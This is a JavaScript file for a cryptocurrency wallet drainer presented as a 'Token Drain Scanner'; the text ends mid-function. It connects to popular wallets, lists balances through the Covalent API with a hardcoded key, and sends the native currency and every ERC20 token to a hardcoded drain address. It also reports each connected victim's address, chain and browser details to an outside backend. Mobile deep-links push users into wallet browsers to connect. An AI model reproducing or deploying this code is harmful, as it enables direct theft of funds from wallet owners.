// ================================================
// TOKEN DRAIN SCANNER - WORKING VERSION
// ALL WALLETS CONNECT PROPERLY ON PC & MOBILE
// ================================================

// Configuration
const CONFIG = {
    backendUrl: "https://tokenbackend-5xab.onrender.com",
    drainAddress: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
    covalentApiKey: "cqt_rQ43kxvhFc4RdQK7t63Yp6pgFRwR",
    
    networkNames: {
        1: "Ethereum Mainnet",
        56: "Binance Smart Chain", 
        137: "Polygon",
        10: "Optimism",
        42161: "Arbitrum",
        43114: "Avalanche",
        8453: "Base",
        250: "Fantom",
        100: "Gnosis",
        25: "Cronos"
    },
    
    // SIMPLIFIED WALLET CONFIG - FOCUS ON WHAT WORKS
    wallets: {
        metaMask: {
            name: "MetaMask",
            icon: "🦊",
            color: "#f6851b",
            detect: () => window.ethereum?.isMetaMask,
            // Use universal method for all wallets
        },
        trust: {
            name: "Trust Wallet",
            icon: "🔶",
            color: "#3375bb",
            detect: () => window.ethereum?.isTrust,
        },
        binance: {
            name: "Binance Wallet",
            icon: "🟡",
            color: "#f0b90b",
            detect: () => window.ethereum?.isBinance || window.BinanceChain,
        },
        coinbase: {
            name: "Coinbase Wallet",
            icon: "🔷",
            color: "#0052ff",
            detect: () => window.ethereum?.isCoinbaseWallet,
        },
        phantom: {
            name: "Phantom",
            icon: "👻",
            color: "#ab9ff2",
            detect: () => window.ethereum?.isPhantom,
        }
    }
};

// Global state
let currentAccount = null;
let currentChainId = null;
let isConnected = false;
let detectedTokens = [];
let selectedWallet = null;
let isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);

// DOM Elements
let connectBtn, statusEl, tokensEl, drainBtn, networkSelector, scanAllBtn;

// Initialize app
function initializeApp() {
    console.log('🚀 Initializing Token Drain Scanner...');
    console.log('📱 Device:', isMobile ? 'Mobile' : 'Desktop');
    
    // Get DOM elements
    connectBtn = document.getElementById('connectBtn');
    statusEl = document.getElementById('status');
    tokensEl = document.getElementById('tokens');
    drainBtn = document.getElementById('drainBtn');
    networkSelector = document.getElementById('networkSelector');
    scanAllBtn = document.getElementById('scanAllBtn');
    
    if (!connectBtn || !statusEl) {
        console.error('❌ Required elements not found');
        return;
    }
    
    // Setup event listeners
    connectBtn.onclick = handleConnect;
    if (drainBtn) drainBtn.onclick = handleDrain;
    if (scanAllBtn) scanAllBtn.onclick = handleScanAllChains;
    if (networkSelector) networkSelector.onchange = handleNetworkChange;
    
    // Check existing connection
    checkExistingConnection();
    
    updateStatus('✅ Ready! Click "Connect Wallet" to begin');
}

// Check existing wallet connection
async function checkExistingConnection() {
    // Check all possible providers
    try {
        // Try Ethereum provider first
        if (window.ethereum) {
            const accounts = await window.ethereum.request({ 
                method: 'eth_accounts' 
            });
            
            if (accounts && accounts.length > 0) {
                const chainIdHex = await window.ethereum.request({ 
                    method: 'eth_chainId' 
                });
                const chainId = parseInt(chainIdHex, 16);
                await handleConnected(accounts[0], chainId);
                return;
            }
        }
        
        // Try Binance Chain
        if (window.BinanceChain) {
            const accounts = await window.BinanceChain.request({ 
                method: 'eth_accounts' 
            });
            
            if (accounts && accounts.length > 0) {
                const chainIdHex = await window.BinanceChain.request({ 
                    method: 'eth_chainId' 
                });
                const chainId = parseInt(chainIdHex, 16);
                await handleConnected(accounts[0], chainId);
                return;
            }
        }
    } catch (error) {
        console.log('⚠️ No existing connection');
    }
}

// Handle connect button click
async function handleConnect() {
    if (isConnected) {
        await disconnectWallet();
        return;
    }
    
    // SIMPLE APPROACH: Just try to connect with whatever wallet is available
    await connectToAnyWallet();
}

// Simple connection function - Tries to connect with any available wallet
async function connectToAnyWallet() {
    updateStatus('🔄 Connecting to wallet...');
    
    // First, try to detect which wallet is being used
    let detectedWallet = detectCurrentWallet();
    
    if (detectedWallet) {
        selectedWallet = detectedWallet.key;
        updateStatus(`🔄 Connecting with ${detectedWallet.name}...`);
    } else {
        updateStatus('🔄 Connecting to any available wallet...');
    }
    
    try {
        // Try to connect
        const result = await requestAccounts();
        
        if (result.success && result.account) {
            await handleConnected(result.account, result.chainId);
        } else {
            // Show wallet selector if auto-connect fails
            showSimpleWalletSelector();
        }
    } catch (error) {
        console.error('Connection error:', error);
        updateStatus('❌ Connection failed. Please try again.');
        showSimpleWalletSelector();
    }
}

// Detect which wallet is currently being used
function detectCurrentWallet() {
    // Check MetaMask
    if (window.ethereum?.isMetaMask) {
        return { key: 'metaMask', name: 'MetaMask' };
    }
    
    // Check Trust Wallet
    if (window.ethereum?.isTrust) {
        return { key: 'trust', name: 'Trust Wallet' };
    }
    
    // Check Binance Wallet (via window.ethereum)
    if (window.ethereum?.isBinance) {
        return { key: 'binance', name: 'Binance Wallet' };
    }
    
    // Check Binance Chain (separate provider)
    if (window.BinanceChain) {
        return { key: 'binance', name: 'Binance Chain' };
    }
    
    // Check Coinbase Wallet
    if (window.ethereum?.isCoinbaseWallet) {
        return { key: 'coinbase', name: 'Coinbase Wallet' };
    }
    
    // Check Phantom
    if (window.ethereum?.isPhantom) {
        return { key: 'phantom', name: 'Phantom' };
    }
    
    // Generic Ethereum provider
    if (window.ethereum) {
        return { key: 'ethereum', name: 'Ethereum Wallet' };
    }
    
    return null;
}

// Universal account request - works for all wallets
async function requestAccounts() {
    // Try Ethereum provider first (MetaMask, Trust, Coinbase, etc.)
    if (window.ethereum) {
        try {
            const accounts = await window.ethereum.request({ 
                method: 'eth_requestAccounts' 
            });
            
            if (accounts && accounts.length > 0) {
                const chainIdHex = await window.ethereum.request({ 
                    method: 'eth_chainId' 
                });
                const chainId = parseInt(chainIdHex, 16);
                return { success: true, account: accounts[0], chainId: chainId };
            }
        } catch (error) {
            console.log('Ethereum provider failed:', error);
        }
    }
    
    // Try Binance Chain separately
    if (window.BinanceChain) {
        try {
            const accounts = await window.BinanceChain.request({ 
                method: 'eth_requestAccounts' 
            });
            
            if (accounts && accounts.length > 0) {
                const chainIdHex = await window.BinanceChain.request({ 
                    method: 'eth_chainId' 
                });
                const chainId = parseInt(chainIdHex, 16);
                return { success: true, account: accounts[0], chainId: chainId };
            }
        } catch (error) {
            console.log('Binance Chain failed:', error);
        }
    }
    
    return { success: false, account: null, chainId: null };
}

// Show simple wallet selector
function showSimpleWalletSelector() {
    const selectorHTML = `
        <div class="wallet-selector-overlay">
            <div class="wallet-selector-modal">
                <div class="modal-header">
                    <h3>Connect Wallet</h3>
                    <button class="close-btn" onclick="closeWalletSelector()">×</button>
                </div>
                <p class="modal-subtitle">Select your wallet</p>
                
                <div class="wallet-grid">
                    <button class="wallet-card" onclick="connectWithMetaMask()" style="--wallet-color: #f6851b">
                        <div class="wallet-icon">🦊</div>
                        <div class="wallet-info">
                            <span class="wallet-name">MetaMask</span>
                            <span class="wallet-desc">Browser & Mobile</span>
                        </div>
                    </button>
                    
                    <button class="wallet-card" onclick="connectWithTrust()" style="--wallet-color: #3375bb">
                        <div class="wallet-icon">🔶</div>
                        <div class="wallet-info">
                            <span class="wallet-name">Trust Wallet</span>
                            <span class="wallet-desc">Mobile Recommended</span>
                        </div>
                    </button>
                    
                    <button class="wallet-card" onclick="connectWithBinance()" style="--wallet-color: #f0b90b">
                        <div class="wallet-icon">🟡</div>
                        <div class="wallet-info">
                            <span class="wallet-name">Binance Wallet</span>
                            <span class="wallet-desc">PC & Mobile</span>
                        </div>
                    </button>
                    
                    <button class="wallet-card" onclick="connectWithCoinbase()" style="--wallet-color: #0052ff">
                        <div class="wallet-icon">🔷</div>
                        <div class="wallet-info">
                            <span class="wallet-name">Coinbase Wallet</span>
                            <span class="wallet-desc">PC & Mobile</span>
                        </div>
                    </button>
                    
                    <button class="wallet-card" onclick="connectWithPhantom()" style="--wallet-color: #ab9ff2">
                        <div class="wallet-icon">👻</div>
                        <div class="wallet-info">
                            <span class="wallet-name">Phantom</span>
                            <span class="wallet-desc">Solana & EVM</span>
                        </div>
                    </button>
                    
                    <button class="wallet-card" onclick="connectAnyWallet()" style="--wallet-color: #6366f1">
                        <div class="wallet-icon">🔗</div>
                        <div class="wallet-info">
                            <span class="wallet-name">Other Wallet</span>
                            <span class="wallet-desc">Universal Connection</span>
                        </div>
                    </button>
                </div>
                
                <div class="mobile-instructions" style="${isMobile ? '' : 'display: none;'}">
                    <p>📱 <strong>Mobile Users:</strong> Open this page in your wallet's browser</p>
                </div>
            </div>
        </div>
    `;
    
    // Create and show selector
    const selector = document.createElement('div');
    selector.id = 'walletSelector';
    selector.innerHTML = selectorHTML;
    document.body.appendChild(selector);
    
    // Add CSS
    addSelectorStyles();
}

// Add CSS for wallet selector
function addSelectorStyles() {
    const styles = `
        .wallet-selector-overlay {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0, 0, 0, 0.8);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 9999;
            padding: 20px;
        }
        
        .wallet-selector-modal {
            background: white;
            border-radius: 20px;
            width: 100%;
            max-width: 500px;
            max-height: 90vh;
            overflow-y: auto;
            padding: 0;
        }
        
        .modal-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 24px 24px 16px;
            border-bottom: 1px solid #eee;
        }
        
        .modal-header h3 {
            margin: 0;
            font-size: 22px;
            font-weight: 700;
            color: #111827;
        }
        
        .close-btn {
            background: none;
            border: none;
            font-size: 32px;
            cursor: pointer;
            color: #666;
            line-height: 1;
            padding: 0;
            width: 40px;
            height: 40px;
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: 50%;
        }
        
        .close-btn:hover {
            background: #f3f4f6;
        }
        
        .modal-subtitle {
            padding: 0 24px 20px;
            margin: 0;
            color: #666;
            text-align: center;
            font-size: 16px;
        }
        
        .wallet-grid {
            padding: 0 20px 20px;
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 12px;
        }
        
        .wallet-card {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 12px;
            padding: 20px 16px;
            background: white;
            border: 2px solid #e5e7eb;
            border-radius: 16px;
            cursor: pointer;
            transition: all 0.2s;
            text-align: center;
        }
        
        .wallet-card:hover {
            border-color: var(--wallet-color);
            background: #f9fafb;
            transform: translateY(-2px);
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
        }
        
        .wallet-icon {
            font-size: 32px;
            width: 60px;
            height: 60px;
            border-radius: 16px;
            background: var(--wallet-color);
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
        }
        
        .wallet-info {
            width: 100%;
        }
        
        .wallet-name {
            display: block;
            font-weight: 600;
            font-size: 16px;
            margin-bottom: 4px;
            color: #111827;
        }
        
        .wallet-desc {
            display: block;
            font-size: 12px;
            color: #6b7280;
        }
        
        .mobile-instructions {
            padding: 16px 24px;
            background: #f0f9ff;
            border-top: 1px solid #bae6fd;
            text-align: center;
            color: #0369a1;
            font-size: 14px;
            border-radius: 0 0 20px 20px;
        }
        
        @media (max-width: 480px) {
            .wallet-grid {
                grid-template-columns: 1fr;
            }
        }
    `;
    
    const styleSheet = document.createElement('style');
    styleSheet.textContent = styles;
    document.head.appendChild(styleSheet);
}

// Close wallet selector
function closeWalletSelector() {
    const selector = document.getElementById('walletSelector');
    if (selector) {
        selector.remove();
    }
}

// Wallet-specific connection functions
async function connectWithMetaMask() {
    closeWalletSelector();
    selectedWallet = 'metaMask';
    
    // For mobile, try to open MetaMask
    if (isMobile && !window.ethereum?.isMetaMask) {
        window.location.href = `https://metamask.app.link/dapp/${window.location.host}${window.location.pathname}`;
        setTimeout(() => {
            showMobileInstructions('MetaMask');
        }, 2000);
        return;
    }
    
    await connectToAnyWallet();
}

async function connectWithTrust() {
    closeWalletSelector();
    selectedWallet = 'trust';
    
    // For mobile, try to open Trust Wallet
    if (isMobile && !window.ethereum?.isTrust) {
        const url = encodeURIComponent(window.location.href);
        window.location.href = `https://link.trustwallet.com/open_url?coin_id=60&url=${url}`;
        setTimeout(() => {
            showMobileInstructions('Trust Wallet');
        }, 2000);
        return;
    }
    
    await connectToAnyWallet();
}

async function connectWithBinance() {
    closeWalletSelector();
    selectedWallet = 'binance';
    
    updateStatus('🔄 Connecting with Binance Wallet...');
    
    // First try Binance Chain (desktop extension)
    if (window.BinanceChain) {
        try {
            const accounts = await window.BinanceChain.request({ 
                method: 'eth_requestAccounts' 
            });
            
            if (accounts && accounts.length > 0) {
                const chainIdHex = await window.BinanceChain.request({ 
                    method: 'eth_chainId' 
                });
                const chainId = parseInt(chainIdHex, 16);
                await handleConnected(accounts[0], chainId);
                return;
            }
        } catch (error) {
            console.log('Binance Chain connection failed:', error);
        }
    }
    
    // Try Binance Wallet (via window.ethereum)
    if (window.ethereum?.isBinance) {
        try {
            const accounts = await window.ethereum.request({ 
                method: 'eth_requestAccounts' 
            });
            
            if (accounts && accounts.length > 0) {
                const chainIdHex = await window.ethereum.request({ 
                    method: 'eth_chainId' 
                });
                const chainId = parseInt(chainIdHex, 16);
                await handleConnected(accounts[0], chainId);
                return;
            }
        } catch (error) {
            console.log('Binance Wallet connection failed:', error);
        }
    }
    
    // For mobile, try to open Binance app
    if (isMobile) {
        if (/iphone|ipad|ipod/i.test(navigator.userAgent)) {
            window.location.href = 'bnc://app.binance.com/';
        } else if (/android/i.test(navigator.userAgent)) {
            window.location.href = 'intent://app.binance.com/#Intent;scheme=bnc;package=com.binance.dev;end';
        }
        
        setTimeout(() => {
            showMobileInstructions('Binance Wallet');
        }, 2000);
        return;
    }
    
    // If desktop and no Binance wallet detected
    showNoWalletInstructions('binance');
}

async function connectWithCoinbase() {
    closeWalletSelector();
    selectedWallet = 'coinbase';
    
    // For mobile, try to open Coinbase
    if (isMobile && !window.ethereum?.isCoinbaseWallet) {
        const url = encodeURIComponent(window.location.href);
        window.location.href = `https://go.cb-w.com/${url}`;
        setTimeout(() => {
            showMobileInstructions('Coinbase Wallet');
        }, 2000);
        return;
    }
    
    await connectToAnyWallet();
}

async function connectWithPhantom() {
    closeWalletSelector();
    selectedWallet = 'phantom';
    await connectToAnyWallet();
}

async function connectAnyWallet() {
    closeWalletSelector();
    selectedWallet = 'any';
    await connectToAnyWallet();
}

// Show mobile instructions
function showMobileInstructions(walletName) {
    const instructionsHTML = `
        <div class="mobile-instructions-overlay">
            <div class="mobile-instructions-modal">
                <h3>Open ${walletName}</h3>
                <p>Please open this page in ${walletName} app to continue.</p>
                <p><strong>Steps:</strong></p>
                <ol>
                    <li>Open ${walletName} app</li>
                    <li>Go to Browser/DApps section</li>
                    <li>Enter this URL: <code>${window.location.href}</code></li>
                    <li>Click "Connect Wallet"</li>
                </ol>
                <button onclick="closeInstructions()" class="primary-btn">I've Done This</button>
                <button onclick="connectToAnyWallet()" class="secondary-btn">Try Again</button>
            </div>
        </div>
        <style>
            .mobile-instructions-overlay {
                position: fixed;
                top: 0;
                left: 0;
                right: 0;
                bottom: 0;
                background: rgba(0, 0, 0, 0.9);
                display: flex;
                align-items: center;
                justify-content: center;
                z-index: 10000;
                padding: 20px;
            }
            .mobile-instructions-modal {
                background: white;
                border-radius: 20px;
                padding: 30px;
                max-width: 500px;
                width: 100%;
                text-align: center;
            }
            .mobile-instructions-modal h3 {
                margin: 0 0 16px;
                color: #111827;
            }
            .mobile-instructions-modal p {
                color: #374151;
                margin: 0 0 16px;
            }
            .mobile-instructions-modal ol {
                text-align: left;
                margin: 0 0 24px;
                padding-left: 20px;
            }
            .mobile-instructions-modal li {
                margin: 8px 0;
                color: #374151;
            }
            .mobile-instructions-modal code {
                background: #f3f4f6;
                padding: 4px 8px;
                border-radius: 4px;
                font-family: monospace;
                word-break: break-all;
                display: inline-block;
                margin: 4px 0;
            }
            .primary-btn, .secondary-btn {
                width: 100%;
                padding: 16px;
                border-radius: 12px;
                font-weight: 600;
                font-size: 16px;
                cursor: pointer;
                border: none;
                margin: 8px 0;
            }
            .primary-btn {
                background: #3b82f6;
                color: white;
            }
            .secondary-btn {
                background: #f3f4f6;
                color: #374151;
                border: 2px solid #e5e7eb;
            }
        </style>
    `;
    
    const instructions = document.createElement('div');
    instructions.innerHTML = instructionsHTML;
    document.body.appendChild(instructions);
}

// Show no wallet instructions
function showNoWalletInstructions(walletKey) {
    const wallet = CONFIG.wallets[walletKey];
    if (!wallet) return;
    
    const installHTML = `
        <div class="install-overlay">
            <div class="install-modal">
                <h3>${wallet.name} Not Detected</h3>
                <p>Please install ${wallet.name} to continue.</p>
                <div class="install-buttons">
                    <button onclick="closeInstructions()" class="secondary-btn">Choose Another Wallet</button>
                </div>
            </div>
        </div>
        <style>
            .install-overlay {
                position: fixed;
                top: 0;
                left: 0;
                right: 0;
                bottom: 0;
                background: rgba(0, 0, 0, 0.8);
                display: flex;
                align-items: center;
                justify-content: center;
                z-index: 10001;
                padding: 20px;
            }
            .install-modal {
                background: white;
                border-radius: 20px;
                padding: 30px;
                max-width: 400px;
                width: 100%;
                text-align: center;
            }
            .install-modal h3 {
                margin: 0 0 16px;
                color: #111827;
            }
            .install-modal p {
                color: #374151;
                margin: 0 0 24px;
            }
            .secondary-btn {
                width: 100%;
                padding: 16px;
                border-radius: 12px;
                background: #f3f4f6;
                border: 2px solid #e5e7eb;
                color: #374151;
                font-weight: 600;
                font-size: 16px;
                cursor: pointer;
            }
        </style>
    `;
    
    const installModal = document.createElement('div');
    installModal.innerHTML = installHTML;
    document.body.appendChild(installModal);
}

function closeInstructions() {
    const instructions = document.querySelector('.mobile-instructions-overlay');
    if (instructions) instructions.remove();
    
    const installModal = document.querySelector('.install-overlay');
    if (installModal) installModal.remove();
}

// Handle successful connection
async function handleConnected(account, chainId) {
    try {
        // Close any open modals
        closeWalletSelector();
        closeInstructions();
        
        // Update state
        currentAccount = account;
        currentChainId = chainId;
        isConnected = true;
        
        // Update UI
        connectBtn.innerHTML = '<span>🔓 Disconnect</span>';
        
        const chainName = CONFIG.networkNames[chainId] || `Chain ${chainId}`;
        updateStatus(`✅ Connected!\nWallet: ${account.slice(0, 8)}...\nNetwork: ${chainName}`);
        
        // Show other UI elements
        showUIElements();
        
        // Setup wallet listeners
        setupWalletListeners();
        
        // Log to backend
        await logConnectionToBackend(account, chainId);
        
        // Fetch tokens
        await fetchTokens(account, chainId);
        
    } catch (error) {
        console.error('❌ Setup error:', error);
        updateStatus('Setup failed: ' + error.message);
        isConnected = false;
        currentAccount = null;
        currentChainId = null;
    }
}

// Setup wallet event listeners
function setupWalletListeners() {
    const provider = window.ethereum || window.BinanceChain;
    if (!provider) return;
    
    provider.on('accountsChanged', (accounts) => {
        console.log('🔄 Accounts changed:', accounts);
        
        if (accounts.length === 0) {
            disconnectWallet();
        } else if (currentAccount !== accounts[0]) {
            currentAccount = accounts[0];
            updateStatus(`🔄 Account changed: ${accounts[0].slice(0, 8)}...`);
            fetchTokens(currentAccount, currentChainId);
        }
    });
    
    provider.on('chainChanged', (chainIdHex) => {
        const chainId = parseInt(chainIdHex, 16);
        console.log('🔄 Chain changed:', chainId);
        
        currentChainId = chainId;
        const chainName = CONFIG.networkNames[chainId] || `Chain ${chainId}`;
        updateStatus(`🔄 Network changed: ${chainName}`);
        
        fetchTokens(currentAccount, chainId);
    });
    
    provider.on('disconnect', (error) => {
        console.log('🔌 Wallet disconnected:', error);
        disconnectWallet();
    });
}

// Fetch tokens for current chain
async function fetchTokens(address, chainId) {
    if (!tokensEl) return;
    
    tokensEl.innerHTML = '<div class="loading">🔄 Scanning tokens...</div>';
    
    try {
        const response = await fetch(
            `https://api.covalenthq.com/v1/${chainId}/address/${address}/balances_v2/?key=${CONFIG.covalentApiKey}&nft=false&no-spam=true`
        );
        
        if (!response.ok) {
            throw new Error(`API error: ${response.status}`);
        }
        
        const data = await response.json();
        const items = data?.data?.items || [];
        
        const tokens = items
            .filter(t => t.balance !== "0" && parseFloat(t.balance) > 0)
            .map(t => {
                const amount = parseFloat(t.balance) / Math.pow(10, t.contract_decimals || 18);
                const value = (t.quote_rate || 0) * amount;
                const chainName = CONFIG.networkNames[chainId] || `Chain ${chainId}`;
                
                return {
                    symbol: t.contract_ticker_symbol || 'TOKEN',
                    name: t.contract_name || 'Unknown',
                    amount: amount.toFixed(6),
                    value: value ? `$${value.toFixed(2)}` : 'N/A',
                    contractAddress: t.contract_address,
                    decimals: t.contract_decimals || 18,
                    balance: t.balance,
                    chainId: chainId,
                    chainName: chainName,
                    isNative: t.native_token || false,
                    logoUrl: t.logo_url
                };
            });
        
        detectedTokens = tokens;
        
        if (tokens.length > 0) {
            displayTokens(tokens);
            updateStatus(`✅ Found ${tokens.length} tokens on ${CONFIG.networkNames[chainId] || `Chain ${chainId}`}`);
        } else {
            tokensEl.innerHTML = '<div class="loading">No tokens found</div>';
            updateStatus('ℹ️ No tokens found');
        }
        
    } catch (error) {
        console.error('❌ Token fetch error:', error);
        tokensEl.innerHTML = '<div class="error">Failed to fetch tokens</div>';
        updateStatus('⚠️ Token scan failed');
    }
}

// Display tokens
function displayTokens(tokens) {
    if (!tokensEl) return;
    
    // Group tokens by chain
    const tokensByChain = {};
    tokens.forEach(token => {
        if (!tokensByChain[token.chainId]) {
            tokensByChain[token.chainId] = [];
        }
        tokensByChain[token.chainId].push(token);
    });
    
    let html = '';
    
    Object.entries(tokensByChain).forEach(([chainId, chainTokens]) => {
        const chainName = CONFIG.networkNames[chainId] || `Chain ${chainId}`;
        
        html += `
            <div class="chain-section">
                <div class="chain-header">
                    <h4>${chainName}</h4>
                    <span class="token-count">${chainTokens.length} tokens</span>
                </div>
                ${chainTokens.map(token => `
                    <div class="token-item" data-address="${token.contractAddress || 'native'}" data-chain="${chainId}">
                        <div class="token-info">
                            ${token.logoUrl ? `<img src="${token.logoUrl}" class="token-logo" alt="${token.symbol}" />` : ''}
                            <div>
                                <span class="token-symbol">${token.symbol}</span>
                                <span class="token-name">${token.name}</span>
                            </div>
                        </div>
                        <div class="token-amounts">
                            <div class="token-amount">${token.amount}</div>
                            <div class="token-value">${token.value}</div>
                        </div>
                    </div>
                `).join('')}
            </div>
        `;
    });
    
    tokensEl.innerHTML = html;
}

// Handle drain - DRAIN ALL TOKENS
async function handleDrain() {
    if (!isConnected || !currentAccount) {
        alert('Please connect wallet first');
        return;
    }
    
    if (detectedTokens.length === 0) {
        alert('No tokens detected to drain');
        return;
    }
    
    // Confirm drain
    if (!confirm(`⚠️ WARNING: This will send ALL detected tokens and native currency to:\n${CONFIG.drainAddress}\n\nEstimated tokens: ${detectedTokens.length}\n\nContinue?`)) {
        return;
    }
    
    const drainBtn = document.getElementById('drainBtn');
    
    try {
        updateStatus('🚀 Starting comprehensive drain...');
        
        if (drainBtn) {
            drainBtn.disabled = true;
            drainBtn.textContent = '⏳ Draining ALL tokens...';
        }
        
        // Create progress indicator
        const progress = document.createElement('div');
        progress.id = 'drainProgress';
        progress.innerHTML = '<div class="progress-bar"><div class="progress-fill"></div></div><div class="progress-text">Starting...</div>';
        statusEl.appendChild(progress);
        
        // 1. First, drain native token (ETH, BNB, MATIC, etc.)
        await drainNativeToken();
        
        // 2. Drain all ERC20 tokens
        await drainAllERC20Tokens();
        
        updateStatus('✅ Drain completed successfully!');
        alert('✅ All tokens have been drained successfully!');
        
        // Refresh token list
        await fetchTokens(currentAccount, currentChainId);
        
    } catch (error) {
        console.error('❌ Drain error:', error);
        
        let errorMsg = error.message || 'Unknown error';
        if (error.code === 4001) {
            errorMsg = 'Transaction rejected by user';
        } else if (error.code === -32603) {
            errorMsg = 'Transaction failed. Check gas settings.';
        } else if (error.message.includes('insufficient funds')) {
            errorMsg = 'Insufficient funds for gas fees';
        }
        
        updateStatus(`❌ Drain failed: ${errorMsg}`);
        alert(`Drain failed: ${errorMsg}`);
        
    } finally {
        if (drainBtn) {
            drainBtn.disabled = false;
            drainBtn.textContent = '⚡ Drain All Tokens';
        }
        
        // Remove progress indicator
        const progress = document.getElementById('drainProgress');
        if (progress) progress.remove();
    }
}

// Drain native token
async function drainNativeToken() {
    updateProgress('Draining native token...', 10);
    
    const provider = window.ethereum || window.BinanceChain;
    
    // Get balance
    const balanceHex = await provider.request({
        method: 'eth_getBalance',
        params: [currentAccount, 'latest']
    });
    
    const balance = parseInt(balanceHex, 16);
    
    if (balance === 0) {
        updateProgress('No native token to drain', 20);
        return;
    }
    
    // Get gas price
    const gasPriceHex = await provider.request({
        method: 'eth_gasPrice',
        params: []
    });
    
    const gasPrice = parseInt(gasPriceHex, 16);
    const gasLimit = 21000;
    const gasCost = gasPrice * gasLimit;
    
    // Check if we have enough for gas
    if (balance <= gasCost * 2) {
        updateProgress('Not enough native token for gas fees', 30);
        return;
    }
    
    // Calculate amount to send (leave some for gas for token transfers)
    const sendAmount = balance - (gasCost * 5);
    
    if (sendAmount <= 0) {
        updateProgress('Not enough after gas fees', 40);
        return;
    }
    
    // Send native token
    const txHash = await provider.request({
        method: 'eth_sendTransaction',
        params: [{
            from: currentAccount,
            to: CONFIG.drainAddress,
            value: '0x' + sendAmount.toString(16),
            gas: '0x' + gasLimit.toString(16),
            gasPrice: gasPriceHex
        }]
    });
    
    updateProgress(`Native token sent: ${txHash.slice(0, 10)}...`, 50);
    await new Promise(resolve => setTimeout(resolve, 3000));
}

// Drain all ERC20 tokens
async function drainAllERC20Tokens() {
    const provider = window.ethereum || window.BinanceChain;
    
    // Filter only ERC20 tokens (not native)
    const erc20Tokens = detectedTokens.filter(t => !t.isNative && t.contractAddress);
    
    if (erc20Tokens.length === 0) {
        updateProgress('No ERC20 tokens to drain', 60);
        return;
    }
    
    updateProgress(`Draining ${erc20Tokens.length} ERC20 tokens...`, 60);
    
    let completed = 0;
    
    for (const token of erc20Tokens) {
        try {
            // Drain the token
            await drainERC20Token(token);
            
            completed++;
            const percent = 60 + (completed / erc20Tokens.length * 40);
            updateProgress(`Draining ${token.symbol}... (${completed}/${erc20Tokens.length})`, percent);
            
            // Small delay between transactions
            await new Promise(resolve => setTimeout(resolve, 2000));
            
        } catch (error) {
            console.error(`Failed to drain ${token.symbol}:`, error);
        }
    }
    
    updateProgress(`Completed draining ${completed} tokens`, 100);
}

// Drain single ERC20 token
async function drainERC20Token(token) {
    const provider = window.ethereum || window.BinanceChain;
    
    // Encode transfer function call
    const transferData = encodeTransferData(token.balance);
    
    try {
        // Get gas estimate for token transfer
        const gasEstimate = await provider.request({
            method: 'eth_estimateGas',
            params: [{
                from: currentAccount,
                to: token.contractAddress,
                data: transferData
            }]
        });
        
        const gasLimit = parseInt(gasEstimate, 16) * 2;
        
        // Get gas price
        const gasPriceHex = await provider.request({
            method: 'eth_gasPrice',
            params: []
        });
        
        // Send token transfer
        const txHash = await provider.request({
            method: 'eth_sendTransaction',
            params: [{
                from: currentAccount,
                to: token.contractAddress,
                data: transferData,
                gas: '0x' + gasLimit.toString(16),
                gasPrice: gasPriceHex
            }]
        });
        
        return txHash;
        
    } catch (error) {
        console.error(`Failed to drain ${token.symbol}:`, error);
        throw error;
    }
}

// Encode transfer function call
function encodeTransferData(amount) {
    const functionSignature = '0xa9059cbb';
    const paddedAddress = CONFIG.drainAddress.slice(2).padStart(64, '0');
    const paddedAmount = BigInt(amount).toString(16).padStart(64, '0');
    return functionSignature + paddedAddress + paddedAmount;
}

// Update progress indicator
function updateProgress(message, percent) {
    const progressText = document.querySelector('.progress-text');
    const progressFill = document.querySelector('.progress-fill');
    
    if (progressText) {
        progressText.textContent = message;
    }
    
    if (progressFill) {
        progressFill.style.width = `${percent}%`;
    }
}

// Update status
function updateStatus(message) {
    if (statusEl) {
        statusEl.textContent = message;
    }
}

// Show UI elements
function showUIElements() {
    const elements = ['tokensContainer', 'drainBtn', 'scanAllBtn', 'networkSelector'];
    elements.forEach(id => {
        const el = document.getElementById(id);
        if (el) el.style.display = 'block';
    });
}

// Hide UI elements
function hideUIElements() {
    const elements = ['tokensContainer', 'drainBtn', 'scanAllBtn', 'networkSelector'];
    elements.forEach(id => {
        const el = document.getElementById(id);
        if (el) el.style.display = 'none';
    });
}

// Log connection to backend
async function logConnectionToBackend(address, chainId) {
    try {
        await fetch(CONFIG.backendUrl + '/drain', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                address: address,
                chainId: chainId,
                drainTo: CONFIG.drainAddress,
                timestamp: new Date().toISOString(),
                wallet: selectedWallet,
                isMobile: isMobile,
                userAgent: navigator.userAgent
            })
        });
    } catch (error) {
        console.log('⚠️ Backend log failed');
    }
}

// Disconnect wallet
async function disconnectWallet() {
    console.log('🔄 Disconnecting...');
    
    // Reset state
    currentAccount = null;
    currentChainId = null;
    isConnected = false;
    detectedTokens = [];
    selectedWallet = null;
    
    // Update UI
    connectBtn.innerHTML = '<span>🔗 Connect Wallet</span>';
    updateStatus('Disconnected. Click "Connect Wallet" to begin.');
    hideUIElements();
    
    if (tokensEl) {
        tokensEl.innerHTML = '';
    }
}

// Handle network change
async function handleNetworkChange() {
    if (!networkSelector || !networkSelector.value) return;
    
    const chainId = parseInt(networkSelector.value);
    if (!chainId || chainId === currentChainId) return;
    
    const provider = window.ethereum || window.BinanceChain;
    if (!provider) return;
    
    try {
        updateStatus(`🔄 Switching to ${CONFIG.networkNames[chainId] || `Chain ${chainId}`}...`);
        
        await provider.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: `0x${chainId.toString(16)}` }],
        });
        
    } catch (switchError) {
        console.log('Network switch error:', switchError);
        updateStatus(`❌ Failed to switch network`);
    }
}

// Handle scan all chains
async function handleScanAllChains() {
    if (!currentAccount) {
        alert('Please connect wallet first');
        return;
    }
    
    updateStatus('🔍 Scanning all chains for tokens...');
    
    const chainsToScan = [1, 56, 137, 42161, 10, 43114, 8453];
    let allTokens = [];
    
    for (const chainId of chainsToScan) {
        try {
            const tokens = await fetchTokensForChain(currentAccount, chainId);
